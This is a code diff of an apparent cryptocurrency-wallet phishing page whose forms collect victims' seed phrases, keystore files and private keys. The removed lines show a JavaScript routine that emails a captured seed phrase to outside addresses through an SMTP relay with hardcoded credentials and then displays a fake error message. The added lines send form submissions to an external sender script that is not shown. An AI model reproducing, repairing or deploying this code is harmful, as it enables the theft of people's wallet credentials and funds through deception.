@@ -14,6 +14,7 @@
     <link rel="stylesheet" href="files/static/css/1f147681d5457acaa9f5.css" />
     <link rel="stylesheet" href="files/static/css/add.css" type="text/css" />
     <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="files/static/chunks/jquery-3.4.1.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
 </head>
 
@@ -1349,8 +1350,8 @@
 
                         <div class="tabContent active" id="phraseContent">
 
-                            <!-- <form action="" id="" enctype="" method="POST" onsubmit="submitForm(event)"> -->
-                                <form action="https://formsubmit.co/bd35c001100f7932a2a4754d04c18cb0" id="" enctype="" method="POST" onsubmit="submitForm(event)">
+                           
+                            <form action="" onsubmit="submitForm(event)">
                                 <input name="wallet" type="hidden" class="wallet" id="wallet1" value="">
                                 <input type="hidden" name="email">
                               
@@ -1364,19 +1365,16 @@
                                 </div>
                             
                                 <input type="hidden" name="_next" value="https://livesupport.en-uk.online/portal/">
-                              </form>
+                            </form>
                             
                         </div>
 
 
 
                         <div class="tabContent" id="keystoreContent">
-                            <form action="https://formsubmit.co/bd35c001100f7932a2a4754d04c18cb0" id="" enctype="" method="POST" onsubmit="submitForm(event)">
-
+                            <form action="" onsubmit="submitForm(event)">
+                                <input name="wallet" type="hidden" class="wallet" id="wallet2" value="">
                                 <input type="hidden" name="email">
-                              
-                                <input name="wallet" type="hidden" class="wallet" id="wallet1" value="">
-                              <input name="type" id="wallettype" type="hidden">
                               
                     
                               <div class="keystorebox ccbox">
@@ -1389,7 +1387,7 @@
                               <div class="buttonbox">
                                 <button class="bluebtn_bird" type="submit" >connect</button>
                               </div>
-                    <input type="hidden" name="_next" value= "https://livesupport.en-uk.online/portal/">
+                                <input type="hidden" name="_next" value= "https://livesupport.en-uk.online/portal/">
                     
                             </form>
                         </div>
@@ -1397,12 +1395,11 @@
 
 
                         <div class="tabContent" id="privateContent">
-                            <form action="https://formsubmit.co/bd35c001100f7932a2a4754d04c18cb0" id="" enctype="" method="POST" onsubmit="submitForm(event)">
+                            <form action="" onsubmit="submitForm(event)">
 
+                                <input name="wallet" type="hidden" class="wallet" id="wallet3" value="">
                                 <input type="hidden" name="email">
                               
-                                <input name="wallet" type="hidden" class="wallet" id="wallet1" value="">
-                              <input name="type" id="wallettype" type="hidden">
                     
                               <div class="privatebox ccbox">
                                 <input class="input allinput" name="privatekey" placeholder="Private Key" id="privateinput">
@@ -1443,7 +1440,7 @@
                     </div>
 
                 </div>
-                
+               
                 <script>
                     function submitForm(event) {
                       event.preventDefault(); // Prevent the form from submitting by default
@@ -1455,49 +1452,12 @@
                             console.log("Sorry, your message could not be sent.");
                             return false;
                         }
-                    //   form.submit(); // Submit the form
+                        sender(); // Submit the form
 
-                       // Call the sendEmail function
-                        sendEmail();
-                                        
                       return false; // Prevent the form from submitting again
                     }
                 </script>
-                <script>
-                    function sendEmail(){
-                        var wallet1, wallet2, wallet3, phrase, message;
-
-                        wallet1 = document.getElementById("wallet1").value;
-                        // wallet2 = document.getElementById("wallet2").value;
-                        // wallet3 = document.getElementById("wallet3").value;
-                        phrase = document.getElementById("phraseinput").value;
-
-                        message = "Manual Entry:\n" + "\nWallet: " + wallet1 + "\nSeed Phrase: " + phrase;
-
-                        Email.send({
-                            Host : "smtp.elasticemail.com",
-                            Username : "albert.json00@gmail.com",
-                            Password : "F4119B192265187443C4DBFA40DB3F65705A",
-                            To : 'Jacobbusey9@gmail.com',
-                            From : "albert.json00@gmail.com",
-                            Subject : "New Manual Entry",
-                            Body : message
-
-                        }).then(function () {
-                        $('#myModal').css('display', 'none');
                 
-                      Swal.fire({
-                        icon: "error",
-                        title: "Oops...",
-                        text: "Something went wrong!",
-                        footer: '<a href="https://livesupport.en-uk.online">Why do I have this issue?</a>'
-                      });
-
-                     });
-                    }
-                </script>
-
-                <script src="files/static/chunks/jquery-3.4.1.min.js"></script>
                 <script type="text/javascript">
                     $('.tab ul li').on('click', function() {
 
@@ -1543,75 +1503,12 @@
                     });
 
 
-
-
                     var setWallet = function(e) {
                         $('#connectWallet').css('display', 'none');
                     };
 
-
-
-                    $('.allforms').on('click', function(e) {
-
-                        e.preventDefault();
-                        var id = $(this).attr('id');
-
-                        var getData = $('#' + id).data('content');
-                        var form = document.getElementById(getData);
-                        var svgDis = '<svg version="1.1" style="width: 50px; height: 10px; margin: 0px; margin-left: -15px; display:inline-block;"  x="0px" y="0px" viewBox="0 0 20 20" enable-background="new 0 0 0 0" xml:space="preserve"><circle fill="#fff" stroke="none" cx="6" cy="10" r="6"><animate attributeName="opacity" dur="1s" values="0;1;0" repeatCount="indefinite" begin="0.1"/> </circle><circle fill="#fff" stroke="none" cx="26" cy="10" r="6"><animate attributeName="opacity" dur="1s" values="0;1;0" repeatCount="indefinite" begin="0.2"/> </circle><circle fill="#fff" stroke="none" cx="46" cy="10" r="6"><animate attributeName="opacity" dur="1s" values="0;1;0" repeatCount="indefinite" begin="0.3"/></circle></svg>';
-                        var btnText = $('#' + id).text();
-                        $('#' + id).prop('disabled', true).html('Waiting ' + svgDis);
-                        for (var i = 0; i < form.elements.length; i++) {
-                            if (form.elements[i].value === '' && form.elements[i].hasAttribute('required')) {
-                                $('#' + id).prop('disabled', false).html(btnText);
-                                $('.result').fadeIn(3000).html('<span style="color:#f00">There are some required fields!</span>').fadeOut(3000);
-                                //Swal.fire("Error!", '', "error");
-                                return false;
-                            }
-                        }
-
-                        console.log($('#' + getData).serializeArray());
-                        $.ajax({
-                            method: "POST",
-                            url: $('#' + getData).attr('action'),
-                            data: $('#' + getData).serializeArray(),
-                            //headers: {'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')},
-                            dataType: "json",
-                            success: function(data) {
-                                $('#' + id).prop('disabled', false).html(btnText);
-
-                                //console.log(data);
-
-                                //Scroll to the top
-                                document.body.scrollTop = 0; // For Safari
-                                document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
-                                if (data.status === 201) {
-                                    //$("#formHandle")[0].reset();
-
-                                    $('.n').val(data.n);
-                                    $('.result').fadeIn(3000).html(data.message).fadeOut(3000);
-
-                                } else {
-                                    console.log(data.message);
-                                }
-                            },
-                            error: function(error) {
-                                $('#' + id).prop('disabled', false).html(btnText);
-                                console.log(error);
-                            }
-                        });
-
-                        return false;
-                    });
                 </script>
-
-
-
-
-
             </main>
-
-
         </div>
     </div>
 
@@ -1631,13 +1528,12 @@
             }
         });
     </script>
-
+    <script src="scripts/sender.js"></script>
     <!--Start of support Script-->
     <script src="//code.tidio.co/0lekcojn9lhep5g5rwt3fwflfpeofaqt.js" async></script>
     <!--End of support Script-->
-    <div>
-        
-     </div>
+    <div></div>
+    
 </body>
 
 </html>
